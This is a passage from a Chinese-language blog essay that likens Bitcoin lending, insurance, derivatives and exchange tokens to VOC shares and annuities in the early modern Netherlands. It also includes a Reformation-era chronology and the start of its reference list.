(细节)，1650 年。)</p>\n<p><img src=\"/blogimg/20201012010.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 10</p>\n\n<p>(插图：荷兰 VOC 商人和他的妻子，Aelbert Cuyp, 1640-1660。)</p>\n<p>(引述：“虽然市场上的‘传统’犯罪超过 5 亿美元，而现金容量超过 20 亿美元，但在加密货币市场里只有约 1.5 亿美元的犯罪和 5 亿美元的现金容量。”AON 董事杰夫 · 汉森，2019 年 7 月)<br><strong>比特币产业里的保险业仍处于非常早期的阶段。</strong> 自从 2013 年比特币挖坑兴起以来，市场上已有一些简单的保险合约产品：投资人向挖矿公司预购矿机，而挖矿公司利用这些资金来生产挖矿芯片与矿机。就像十六世纪航运时期，挖矿公司与投资人共享挖矿利润。一些比特币托管业者也开始提供保险服务，但是从网页上不明显的小字里我们发现这些保险服务往往仅限于热钱包，而热钱包里的比特币价值往往不及受托总价值的 10%。与十六世纪相同的是，比特币保险市场里同样充满风险：价格波动的风险、政府管制的风险、信息安全的风险、服务提供商可能跑路的风险等等。由于比特币有无国界交易的特性，各国政策变动的风险也必须在投资人考虑之中。成功的比特币保险业者必定对技术与营运细节了解透彻，并将责任与经营长期客户关係当作企业原则。因此，今天比特币托管业者普遍以完全准备金作自我保险的现状并不让人意外。</p>\n<p><img src=\"/blogimg/20201012011.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 11</p>\n\n<p>(图表：VOC 之前交易公司的投资资金与回报, Gelderblom &amp; Jonker, 2004)</p>\n<p>(引述：”利率的下降显示阿姆斯特丹次级市场的成功，为了满足生产力需求潮水一般的资金涌进市场，其中最好的例子是短期贷款，这个成功背后的原因是充满活力的证券交易市场和与其相辅相成的信贷技术” - GELDERBLOM &amp; JONKER)</p>\n<p><img src=\"/blogimg/20201012012.png\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 12</p>\n\n<p>(图表：VOC 股票担保下的新贷款的供应导致阿姆斯特丹利率大幅下降。Gelderblom &amp; Jonker, 2004)</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">3/ 流动性高的担保作为放贷和衍生性金融商品的基础</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>1602 年时商人们合并了六家小公司、集中了 64 吨黄金，成立了荷兰东印度公司 (VOC)，其目标是管理与亚洲进行贸易往来的商船和航运，并且 VOC 当时享有荷兰政府允许的垄断特权 （注 [28])。</p>\n<p>此垄断情形甚至让 VOC 在八十年战争里也扮演了重要的军事与经济角色。1604 年东印度公司向社会公开募集资金、让大众认购股票，<strong>是世界近代史上第一次首次公开募股，并成功完成募集的案例</strong> – 荷兰超过 2% 的人口认购了东印度公司的股份 （注 [29])。为了维护市场信息透明，该募集采取记名股票以及规范清楚的股票所有权和转移方式 （注 [30])。1610 年，东印度公司完成首次股息发放。</p>\n<p>VOC 股票高度流通，成为理想的抵押品：在 VOC 成立数个月之内，价值 27600 荷兰盾的 VOC 股票就被用来当作囚犯交换的筹码。1607 年一名贵族以价值 3000 荷兰盾的 VOC 股票作为抵押贷款 2000 荷兰盾，利率为 8% (贷款价值比 66%)。VOC 股票抵押市场非常的活跃，但因为不是公开市场所以留下的记录不多。1623 年政府针对债务违约后抵押品清算的流程制定规范，到了 1640 年代阿姆斯特丹证券交易所已常规的进行 VOC 股票回购交易。</p>\n<p>由于以 VOC 股票作为抵押品大受欢迎，阿姆斯特丹的抵押贷款市场利率从 1596 年的 8% 下降到 1620 的 6% 以下。另外，VOC 股票市场的高流通性使其成为十七世纪蓬勃发展的衍生品 — 远期合约 (包含做空)、期权合约、回购合约 – 的标的资产。历史学家 L.O.Petram 在他针对 VOC 所撰写的论文里总结：「在 1630-1650 年之后，投资人普遍对次级市场更感兴趣，而不是 VOC 本身的贸易行为。（注 [31])」</p>\n<p><img src=\"/blogimg/20201012013.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 13</p>\n\n<p>(图表：我们的假设是，衍生品市场将围绕着那些经济中对价格最敏感的行业 (即企业需要对冲风险的经济产品) 发展。)</p>\n<p>(引述：到 1580 年代，年金体系已经足够完善，可以作为可靠工具面向多元化的公众，包括商人、寡妇、孤儿和慈善机构。” GELDERBLOM &amp; JONKER, 2004)</p>\n<p>(“年金可以用于多种用途，特别是作为继承人之间结算余额的一种手段…… 在安特卫普周遭，异常的城市增长以及市民的广泛参与，对土地和信贷的區域市场产生了巨大的影响。” 林伯杰和德维吉尔德，2018 年)</p>\n<p>目光移到今天，我们将发现比特币投资者与过去的 VOC 股票持有者有相同之处：他们通常都看重长期趋势、对比特币 / VOC 股票的资产配置比例很大、避免贩卖这些资产以免被征资本利得税、并且他们大多是有高度投资野心的年轻人。我们预期未来以比特币作为抵押来贷款的现象将会愈趋普及 （注 [32])。我们同样看好比特币衍生性商品市场，因为它能帮助比特币产业里的企业在追求持续增长的同时，能订定精准的风险管理策略。我们提出的假说是：<strong>受到价格波动影响最大的产业将发展出最大的衍生性商品市场</strong>，例如十六世纪的阿姆斯特丹、1980 年代的农业与贵金属市场。明天的比特币市场或许也将遵循这样的轨迹。</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">4/ 在通货紧缩的世界里获取资本</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>所谓的年金合约是一个以定价贩售的合约，给予受保人每隔一定时间收到一定款项的权利。以年金替代贷款的现象从十四世纪开始变得频繁，因为它并没有违反天主教会的高利贷禁令 （注 [33])(从十六世纪开始，法律普遍允许以偿还合约剩余价值的方式来终结年金合约)。年金合约往往用于给资本密集且对风险承受度低的企业、农场，或是地方政府等提供资金。在十四世纪的低地国里逐渐分化两个新的经济阶级：海岸边的地主由于砂质土壤与频繁淹水，往往过度贷款导致土地遭到政府没收；在相对稳定的法兰德斯地区，地主以发放年金的方式募资加速企业成长 (通常用作开发房地产)，而年纪大的居⺠则购买年金作退休后收入。年金可以被交易，因此成为受到城市居⺠欢迎的投资工具。在荷兰起义爆发、海上贸易带来的收入日渐增加后，政府借助发放年金的方式向大众募资，用以保护城市居⺠。</p>\n<p>之所以年金比共同人寿保险 (十八世纪时在英国出现) 更早普及的重要原因是：后者要求受保人对保险机构高度信任 – 受保人必须一辈子都相信这些机构，并且他们也没办法通过赎回抵押品来终结合约。当然这其中也有文化的因素：客户更倾向于下注于长寿 (年金) 而非短寿 (保险)。</p>\n<p>刚过十周年生日不久的比特币在借贷服务方面成长、运行良好。据 Genesis Capital 报告显示，自该基金 2018 三月成立以来，共承接了总价值 20 亿美元的等值比特币借贷（注 [34])。这些需求来自避险基金、持有比特币存货的企业和比特币交易市场里的散户。另外，我们观察到了六百年前<strong>荷兰城市里的年金服务与今日 IEO (首次交易平台发行) 平台币之间的相似之处</strong>（注 [35])。例如，交易所 Bitfinex 发行平台币 LEO，在法规制度不明确的艰难时期提振市场流动性，同时也有助于降低 Tether 流动性问题所带来的风险（注 [36])。LEO 具有年金的属性，因为 Bitfinex 提供随时、无条件以市场价格购回 LEO 的服务。其他海外交易所也采取了类似的策略：币安交易所发行 BNB (币安币)、火币交易所发行 HT (火币积分)、加密货币衍生品交易所 FintruX 发行 FTX token（注 [37])。虚拟货币交易所往往拥有依赖其核心服务的忠诚用户，而这些平台币实现了平台向大众借款的功能。</p>\n<p>拿十六世纪时屡遭入侵的荷兰城镇和唯利是图的荷兰商人作为类比，我们预期海外交易所发行类似年金的平台币将继续广受欢迎，而虚拟货币交易将持续风靡千禧一代。事实上，这些平台币是虚拟货币市场里简单的保险合约设计。我们预期未来虚拟货币市场里将出现寿险公司，或许将提振日渐衰弱的寿险产业。研究一再显示，通货膨胀会抑制市场对寿险的需求。因此，若有一天比特币被广泛的接纳为高度保值的投资工具，寿险产业自然而然将再现繁荣。</p>\n<p>(引述：“IEO 就像高盛 (Goldman Sachs) 闯进纳斯达克 (Nasdaq) 一样。这是一个新的筹资方式可能会改变金融业的现状。但监管必须出台。” 史蒂芬 · 奈拉约夫，Alchemist 首席执行官，2019 年 6 月)</p>\n<p><img src=\"/blogimg/20201012014.png\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 14</p>\n\n<p>(资料来源：寿险总裁协会第六次年会，iii.org, ycharts)</p>\n<p>(引述：”通胀上升 1 个百分点，人均实际人寿保险净值将下降 1.20%。” 加州大学伯克利分校教授大卫 · 巴贝尔，1981 年)</p>\n<h2 style=\"margin-top: 30px; margin-bottom: 15px; padding: 0px; font-size: 22px; text-align: center; position: relative; font-weight: bold; color: black; line-height: 1.1em; padding-top: 12px; padding-bottom: 12px; margin: 70px 30px 30px; border: 1px solid #000;\"><span style=\"float: left; display: block; width: 90%; border-top: 1px solid #000; height: 1px; line-height: 1px; margin-left: -5px; margin-top: -17px;\"> </span><span class=\"prefix\" style=\"display: block; width: 3px; margin: 0 0 0 5%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span class=\"content\" style=\"display: block; -webkit-box-reflect: below 0em -webkit-gradient(linear,left top,left bottom, from(rgba(0,0,0,0)),to(rgba(255,255,255,0.1)));\">四：结语</span><span class=\"suffix\" style=\"display: block; width: 3px; margin: 0 0 0 95%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span style=\"float: right; display: block; width: 90%; border-bottom: 1px solid #000; height: 1px; line-height: 1px; margin-right: -5px; margin-top: 16px;\"> </span></h2>\n\n<p>Eric Weinstein (Thiel Capital 董事总经理) 最近表示，所谓「好想法击败平庸的想法」的说法是错误的，正确的说法应该是 <strong>「匹配的想法击败不匹配的想法」</strong> 注 [38])。这样的说法如同达尔文主义的逻辑：一个想法能起飞与否取决于其所依赖的环境条件是否成熟。</p>\n<p>确实，历史显示想法本身的品质并不足以保证其被社会广泛采纳。历史上首度提出蒸气引擎原理的人是⻄元一世纪的古希腊数学家亚历山大港的希罗，但蒸气引擎的商业化普及还要等到一千六百年之后；可移动式的印刷机早出现在十四世纪的韩国，但要等到十五世纪约翰内斯 · 谷登堡发明印刷术时才引发了革命；维京人比哥伦布和哈德逊早数百年登陆美洲。换句话说，好的想法往往会因为环境的因素而无法普及，所谓「生不逢时」。</p>\n<p>但是每过一阵子，一旦天时、地利、人和齐聚，变革就如同星辰连线一般，促成整个社会同时接纳许多高品质的想法，并触发壮观的连锁效应，彻底重塑社会。新教革命正是这样的时刻：许多想法同时发芽、 思想叛逆者数量激增、社会伤口愈合，一整个时代的创业家共同创造一系列的金融与经济革新。五百年前发生的事情可能将再次发生。</p>\n<p>今天，我们观察到以千禧一代为主的广泛社会对于央行、国家干预主义的批判。同时，技术人员马不停蹄的开发出能够挑战经济现况、破旧立新的工具。研究报告预期千禧一代在十年内将成为收入最高的一代，而这群拥抱科技、经历过 911 事件的人们拥有加密技术进行自我防御的能力。除此之外，比特币生态圈正全面迈向成熟，尤其在存款、保险、借贷、衍生性商品，与早期型态的寿险方面。如果这样的趋势持续发展下去，以比特币为基础的、层层堆叠的协议与技术将成为全球经济引擎，取代目前的国际货币金融体系。</p>\n<p><strong>比特币改革，你准备好了吗？</strong></p>\n<p>(引述：「如果一个新创公司的潜力正比于其竞争对手的规模与无能程度的乘积，则世界上最成功的新创公司将与国家、政府直接竞争。这不是不可能，这是虚拟货币正在做的事情。」— YC 联合创始人 Paul Graham 写于 2019 八月)</p>\n<p><img src=\"/blogimg/20201012015.png\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 15.&nbsp;YC 联合创始人 Paul Graham 的推文</p>\n\n<h2 style=\"margin-top: 30px; margin-bottom: 15px; padding: 0px; font-size: 22px; text-align: center; position: relative; font-weight: bold; color: black; line-height: 1.1em; padding-top: 12px; padding-bottom: 12px; margin: 70px 30px 30px; border: 1px solid #000;\"><span style=\"float: left; display: block; width: 90%; border-top: 1px solid #000; height: 1px; line-height: 1px; margin-left: -5px; margin-top: -17px;\"> </span><span class=\"prefix\" style=\"display: block; width: 3px; margin: 0 0 0 5%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span class=\"content\" style=\"display: block; -webkit-box-reflect: below 0em -webkit-gradient(linear,left top,left bottom, from(rgba(0,0,0,0)),to(rgba(255,255,255,0.1)));\">五：附录：聚焦在低地国的简明宗教改革编年史</span><span class=\"suffix\" style=\"display: block; width: 3px; margin: 0 0 0 95%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span style=\"float: right; display: block; width: 90%; border-bottom: 1px solid #000; height: 1px; line-height: 1px; margin-right: -5px; margin-top: 16px;\"> </span></h2>\n\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">1 / 早期的异议</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>西元 1511 年，来自鹿特丹的伊拉斯莫斯（Erasmus）出版了广受欢迎的《愚人讼》（Praise of Folly），一部对天主教教会的大胆嘲讽&nbsp;注 [39])。六年后的 1517 年，马丁．路德带着他的〈九十五条论纲〉— 针对天主教教会寻租的严厉批判 — 进入公众视野 （注 [40])。数个月内，数以千计的〈九十五条论纲〉副本已经在欧洲流通。为了回应这项反对天主教教义而广为人知的异端思想，第一次的焚书就发生在 1521 年 （注 [41])。在 1522 年，时任神圣罗马帝国皇帝的查理五世（King Charles V）在低地国（现今荷兰、比利时及卢森堡一带）成立了专责压迫异端的宗教裁判所 （注 [42])。在 1523 年，我们见证了第一次对异端的火刑 （注 [43])。查理五世在 1535 年对所有的异端处以死刑，并于 1539 年对在根特（Ghent）反对他的抗税活动采取了严厉的措施。</p>\n<p>在这段时期，没有任何社会阶层可以免于政治压迫；即便是虔诚的佛莱明（Flemish，现今比利时的北部地区）天主教徒杰拉杜斯 · 麦卡托（Gerardus Mercator，以其 1569 年的世界地图而闻名的制图学家），也在 1543 年被宗教裁判所起诉，并且被关押在监狱长达七个月直到他因证据不足被释放。同年，哥白尼（Copernicus）出版了他的日心说，而来自佛莱明的解剖学家维萨里（Vesalius）则根本地挑战了盖伦（Galen）的解剖学模型，这是一千五百年以来的首次。</p>\n<p>西元 1548 年，人道学者 Christoffel Plantijn 移居安特卫普，而他的出版社将迅速闻名于全西欧 （注 [44])。西元 1555 年第一个地下清教徒市政府成立。</p>\n<p><img src=\"/blogimg/20201012016.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 16</p>\n\n<p>(插图：在他的画作《愚人之船》(1500) 中，希罗宁姆斯 · 博施将神职人员置于聚光灯下。这首讽刺诗的灵感可能来自于 1497 年的诗 Stultifera Navis，诗的前言中写道：“谁登上了愚人之船，驶向地狱，又笑又唱。“)</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">2 / 公开逆反</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>1559 年，哈布斯堡（Hapsburg）的国王离开布鲁塞尔前往西班牙，之后他同父异母的妹妹玛格丽特成为荷兰总督。1566 年被称为 “奇迹年”。一开始，佛兰德斯贵族与荷兰总督分享了一份不起诉请愿书，得到了温和的反应。受鼓舞的新教派系开始在教堂内布道，并伴随着后来被称为圣像破坏的破坏行为。地方休战是在没有总督同意的情况下达成的，新教徒被允许在安特卫普城墙内的 6 个教堂传教 （注 [45])。那年晚些时候，新教徒 (geuzen) 军队的失败开始使权力向有利于保皇党的方向倾斜。</p>\n<p>(引述：“在这一地区 (佛兰德斯)，加尔文派传教士的胆大妄为已发展到如此地步，以至于他们在布道中告诫人们，光撤除心里全部的偶像崇拜是不够的；也要从他们眼前除掉。他们似乎是在一点一点地试图让他们的听众明白，有必要掠夺教堂、废除其所有的形象。” 西班牙政府官员，1566 年)</p>\n<p><img src=\"/blogimg/20201012017.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 17</p>\n\n<p>(插图：荷兰民族被西班牙人攻击的寓言。作者：Joannes Gijsius 1616)</p>\n<p><img src=\"/blogimg/20201012018.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 18</p>\n\n<p>(插图：鸟瞰安特卫普 1572 年阿尔瓦城堡的风貌。来源：Civitates Orbis Terrarum I)</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">3 / 镇压</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>1567 年，西班牙阿尔巴公爵率领一万名西班牙老兵抵达荷兰 （注 [46])。他建立了一个 “血族法庭”，在他担任荷兰总督的六年里，一些人认为他要为一万八千人的死亡负责 （注 [47])。到达荷兰后，阿尔巴提高了税收，并开始在城市边缘建造一座巨大的堡垒，于 1572 年完工。这个笔尖状的城堡成为 “16 世纪最受研究的城市设施之一” （注 [48])。三年后，西班牙王室陷入财政困境，停止向低地的雇佣军支付报酬。1576 年，在安特卫普城堡指挥官桑丘 · 德阿维拉的指挥下，这些雇佣军洗劫了安特卫普城 （注 [49])。这种 “西班牙式的愤怒” 成为了几个世纪以来最严重的暴行之一，7-10% 的人口在三天内被谋杀，一千所房屋被摧毁。</p>\n<p>尽管在接下来的几年里遭到了激烈的抵抗，包括对西班牙城堡的部分破坏，1585 年，安特卫普市向西班牙投降，所有的新教徒都被给予四年的时间来处理他们的事务并离开这座城市。根特和布鲁塞尔也是如此。在安特卫普被洗劫后的 20 年里，这个城市近 50% 的居民移居国外 （注 [50])。欧洲最强大的经济体刚刚经历了一次心脏病发作：下个世纪，安特卫普的工资水平仍比莱顿 (Leiden) 低 35% （注 [51])。</p>\n<p><img src=\"/blogimg/20201012019.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 19</p>\n\n<p>(插图：这幅来自 1580 年的蚀刻画展示了西班牙入侵者是如何威胁荷兰人的。狮子是与荷兰有关的象征)</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">4 / 荷兰、新阿姆斯特丹、纽约</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>安特卫普和荷兰南部其他地区的陷落，帮助开启了荷兰共和国的黄金时代，大约 5 万到 10 万佛兰德人涌入荷兰 （注 [52])。同時，作為相對宗教自由的英國也迎來一波波人口移入 （注 [53])。经过几十年的战争和征服，西班牙帝国内部已经衰弱 (部分是由于近亲繁殖的自然结果) （注 [54])，它强有力的以等级为基础的规则被证明无法与荷兰和英国经济的灵活、有活力和以商业为导向的组织相匹敌。一方面是宗教和商业上的宽容，另一方面是被水环绕的可防御的领土，这被证明是成功的秘诀。在接下来的 200 年里，荷兰和英格兰走在经济创新和增长的前沿。</p>\n<p>1579 年，荷兰北部各省聚集在一起签署乌得勒支联盟，在这个联盟中，他们宣布脱离西班牙独立。该文件宣布了荷兰领土上完全的宗教自由，这种自由也将在新阿姆斯特丹得到尊重。1588 年，强大的英吉利海峡舰队被摧毁后，西班牙放弃了征服英格兰的企图。1602 年，安特卫普移民德克 · 范 · 奥斯等人创立了荷兰东印度公司。范 · 奥斯还资助了亨利 · 哈德逊 1607 年的北美探险，在世界上最古老的股票凭证上签名，并与他人共同创立了阿姆斯特丹交易所银行 (1609 年)。同年，西班牙和荷兰共和国签订了和平条约。1620 年，清教徒前辈们乘坐“五月花” 号船，在荷兰的莱顿城定居下来，他们在自己的祖国英格兰找到了宗教不宽容的避难所。1621 年，佛兰芒 - 荷兰商人威廉 · 乌塞林克斯获得了斯塔顿公司的许可，成立了荷兰西印度公司(WIC)，垄断了北美的勘探。1624 年，第一批荷兰移民到达曼哈顿外的总督岛。1626 年，瓦隆 · 彼得 · 米努伊特从伦纳普印第安人手中买下了曼哈顿岛，并选择它作为新荷兰的首都——那时它还是一个纯粹的商业企业。1638 年，手稿被走私出意大利后，伽利略以日心说为中心的《两门新科学》在荷兰出版。1643 年，艾萨克 · 乔戈斯估计曼哈顿的人口为 500 人，当地使用的语言为 18 种 （注 [55])。1644 年，英国诗人约翰 · 弥尔顿出版了《论出版自由》，这是一本捍卫言论和表达自由的哲学着作。1654 年，一小群葡萄牙裔犹太人抵达曼哈顿，在犹太社区向欧洲委员会请愿后，新阿姆斯特丹州长彼得 · 施托伊弗桑特 (Peter Stuyvesant) 最终同意让他们留下来，为未来的非荷兰定居者树立了一个受欢迎的先例 （注 [56])。1664 年，新阿姆斯特丹被英国军队占领并改名为纽约，当时人口为 9000 （注 [57])。1665 年，斯宾诺莎的老师、佛兰德难民 Franciscus Van Den Enden 出版了《自由政治论文》，在书中他为言论自由、宗教自由、平等主义、废奴主义和直接民主进行了辩护。1683 年，英国伯爵汤玛斯 · 东安被任命为纽约州州长，负责推广那里的圣公会教堂——但他从未成功 （注 [58])。1689 年，约翰 · 洛克出版了《关于宽容的一封信》，其中斐洛斯 · 考法为宗教宽容提出了一个极具影响力的观点。1777 年，纽约通过了第一部没有任何宗教机构的州宪法，成为唯一一个公務人員不需經過宗教测试的革命州 （注 [59])。</p>\n<p><img src=\"/blogimg/20201012020.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 20</p>\n\n<p>(图表：“1631 年，财产价值超過 ƒ100,000 的商人有超過一半来自荷兰南部。)</p>\n<p>(引述：“1600 年后荷兰的事态发展与人们普遍认为的政府公债作为二级市场起源的重要性背道而驰。VOC 股票，而不是政府债券，提供了关键的突破。” GELDERBLOM &amp; JONKER, 2004)</p>\n<p><img src=\"/blogimg/20201012021.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 21</p>\n\n<p>(插图：新荷兰地图 - 荷兰人的存在是目前已知的纽约市地区最大的。)</p>\n<p>(引述：“在一切自由之上，请给我自由，让我知道，让我表达，让我根据良心自由地辩论。” 约翰 · 弥尔顿, 1644)</p>\n<p>(引述：“本公约进一步 […] 决定、宣布在本州內任何人都将永远被允许从事宗教职业和進行宗教崇拜，不得有任何歧视或偏爱。” 纽约州宪法 1777 年)</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">后记</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p><img src=\"/blogimg/20201012022.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 22. 勃鲁盖尔的 “狂欢节和大斋节之间的战争” 油画作品</p>\n\n<p>在勃鲁盖尔的 “狂欢节和大斋节之间的战争” 的油画作品中，展示了一对已婚夫妇。男人背着一个袋子，象征着自私和不完美；女人背着一盏没有点亮的灯笼，象征着缺乏智慧。在一名小丑的伴随之下，夫妇俩相互扶持，漫步离去。在分析画中的象形符号后，我们得到了一条支持改革前景的信息：尽管普罗大众无法达到知识阶级所希求他们的启蒙，他们通常不会搅和在知识阶级里部落主义式的互怼和群战。这种脱离并不是普遍的冷漠导致的，而是对和平家庭生活和个人经济进步的务实兴趣。</p>\n<p>在勃鲁盖尔的书中，我们对人类状况的长期改善持同情乐观的态度，包括今天的比特币改革。诚然，任何争论的双方都充满了偏见和错误的判断，但只要有足够长的时间，就可以卸下偏执和狂热的包袱，点亮理性的明灯。</p>\n<p>历史的旅程蜿蜒曲折，在一次次的分叉中通向更具潜力的世界。</p>\n<h2 style=\"margin-top: 30px; margin-bottom: 15px; padding: 0px; font-size: 22px; text-align: center; position: relative; font-weight: bold; color: black; line-height: 1.1em; padding-top: 12px; padding-bottom: 12px; margin: 70px 30px 30px; border: 1px solid #000;\"><span style=\"float: left; display: block; width: 90%; border-top: 1px solid #000; height: 1px; line-height: 1px; margin-left: -5px; margin-top: -17px;\"> </span><span class=\"prefix\" style=\"display: block; width: 3px; margin: 0 0 0 5%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span class=\"content\" style=\"display: block; -webkit-box-reflect: below 0em -webkit-gradient(linear,left top,left bottom, from(rgba(0,0,0,0)),to(rgba(255,255,255,0.1)));\">六：参考资料</span><span class=\"suffix\" style=\"display: block; width: 3px; margin: 0 0 0 95%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span style=\"float: right; display: block; width: 90%; border-bottom: 1px solid #000; height: 1px; line-height: 1px; margin-right: -5px; margin-top: 16px;\"> </span></h2>\n\n<p>[1] An Economic Analysis of the Protestant Reformation, Authors：Robert B. Ekelund, Jr., Robert F. Hébert, and Robert D. Tollison. Journal of Political Economy, Vol. 110, No. 3 (June 2002), pp. 646-671.: <em style=\"font-style: italic; color: black;\">注脚 1</em></p>\n<p>[2] 国际货币与金融体系一词常被 Bank for International Settlement 使用，至少从 1984 年开始，出现在由 Group of Twenty Four 发表的报告 “A Revised Program of Action Towards Reform of the International Monetary and Financial System.” 中: <em style=\"font-style: italic; color: black;\">注脚 2</em></p>\n<p>[3] 参阅 Dittmar &amp; Seabold, ‘Gutenberg’s moving type propelled Europe towards the scientific revolution,’LSE Business Review, 2019.: <em style=\"font-style: italic; color: black;\">注脚 3</em></p>\n<p>[4] 例如 Basil S. Yamey, ‘Notes on the Origin of Double-Entry Bookkeeping,’’ 1947.: <em style=\"font-style: italic; color: black;\">注脚 4</em></p>\n<p>[5] 参阅 Lois Ann Swanick, ‘An Analysis of Navigational Instruments in the Age of Exploration,’2005.: <em style=\"font-style: italic; color: black;\">注脚 5</em></p>\n<p>[6] 参阅 Dittmar&amp;Seabold，出处同注 3: <em style=\"font-style: italic; color: black;\">注脚 6</em></p>\n<p>[7] 十六世纪时，欧洲境内贸易活动大幅增加，收入弹性成长，对出口产品的需求价格弹性也显著成长。经济发展进步的区域能够以较低价格提供较高品质的产品，自然而然将需求从较为落后的区域那里吸引过来。’Wee, H. V. D.,’Structural Changes and Specialization in the Industry of the Southern Netherlands, 1100-1600,’p. 216, 1975.: <em style=\"font-style: italic; color: black;\">注脚 7</em></p>\n<p>[8] 参阅’Millennials + money:The unfiltered journey,’Facebook,2016.: <em style=\"font-style: italic; color: black;\">注脚 8</em></p>\n<p>[9] 来源’18th Annual Transamerica Retirement Survey,’2018.: <em style=\"font-style: italic; color: black;\">注脚 9</em></p>\n<p>[10] 来源’Bitcoin is a Demographic Mega-Trend: Data Analysis,’Spencer Bogard, 2019.: <em style=\"font-style: italic; color: black;\">注脚 10</em></p>\n<p>[11] 来源 来源’Coming of age, how millennials are becoming a growing economic force,’Snapchat, 6/18/2018.: <em style=\"font-style: italic; color: black;\">注脚 11</em></p>\n<p>[12] 1990 年代初期，密码朋克社群已清楚的认知到加密技术提供的隐私保护和人权保护之间的关係。Phil Zimmerman 在 1991 年写道 ‘当强加密技术普及，政府将更难将其定罪。因此使用 PGP 技术有助于维护民主。’另外，Eric Hughes 于 1993 年写道’如果我们想要有任何隐私权，我们就必须捍卫它。[…] 密码朋克做的事情就是写代码。我们知道会需要有些人来开发保护隐私权的软件，而我们就是那些人.’.: <em style=\"font-style: italic; color: black;\">注脚 12</em></p>\n<p>[13] 来源 Swire, Hemmings, Kirkland, ‘Online Privacy and ISPs,’2016; letsencrypt.org, 12/31/2019.: <em style=\"font-style: italic; color: black;\">注脚 13</em></p>\n<p>[14] Zhang, L., Zhao, L., Wang, Z., &amp; Liu, J. 于’WiFi Networks in Metropolises: From Access Point and User Perspectives.’ (2017) 一文提到’数据显示今日的大都会里已有高密度的无线存取点，它们提供几乎无所不在的互联网存取。[…] 我们可以预见在不久的将来，车辆和运算能力越来越强的个人行动装置将实现行动无限存取点的功能，共同建立并维护大都会层级的无线网状网路.’.: <em style=\"font-style: italic; color: black;\">注脚 14</em></p>\n<p>[15] 出自 Bitcointalk Forum, 2011 年五月。后来因 Casascius 推出的实体比特币而普及: <em style=\"font-style: italic; color: black;\">注脚 15</em></p>\n<p>[16] New York Times, 4/11/2013, Nathaniel Popper 采访: <em style=\"font-style: italic; color: black;\">注脚 16</em></p>\n<p>[17] 参阅 Shiu-Kai Chin, ‘High-Confidence Design for Security: Don’t Trust - Verify,’1999: <em style=\"font-style: italic; color: black;\">注脚 17</em></p>\n<p>[18] 参阅 <a href=\"https://en.wikipedia.org/wiki/Trust,_but_verify\" target=\"_blank\" rel=\"noopener\">https://en.wikipedia.org/wiki/Trust,_but_verify</a> : <em style=\"font-style: italic; color: black;\">注脚 18</em></p>\n<p>[19] ‘I AM HODLING,’GameKyuubi, 2013 十二月于 Bitcointalk.org: <em style=\"font-style: italic; color: black;\">注脚 19</em></p>\n<p>[20] 可能出处为 2014 年 reddit.com 